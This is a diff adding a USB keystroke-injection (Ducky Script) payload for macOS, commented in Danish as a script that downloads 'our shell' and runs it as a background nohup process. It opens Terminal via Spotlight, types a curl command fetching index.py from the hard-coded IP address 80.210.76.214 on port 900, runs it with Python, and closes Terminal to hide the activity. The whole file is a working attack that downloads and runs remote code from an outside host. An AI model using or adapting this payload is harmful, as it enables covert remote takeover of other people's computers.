@@ -1,0 +1,26 @@
+REM apple script der downloader vores shell og kører den som en nohup process
+DELAY 300
+GUI SPACE
+DELAY 50
+STRING terminal
+ENTER
+DELAY 300
+STRING curl /O http
+SHIFT .
+SHIFT 7
+SHIFT 7
+STRING 80.210.76.214
+SHIFT .
+STRING 900
+SHIFT 7
+STRING index.py
+SPACE
+SHIFT 6
+SHIFT 6
+SPACE
+STRING nohup python index.py
+DELAY 35
+ENTER
+GUI q
+DELAY 200
+ENTER
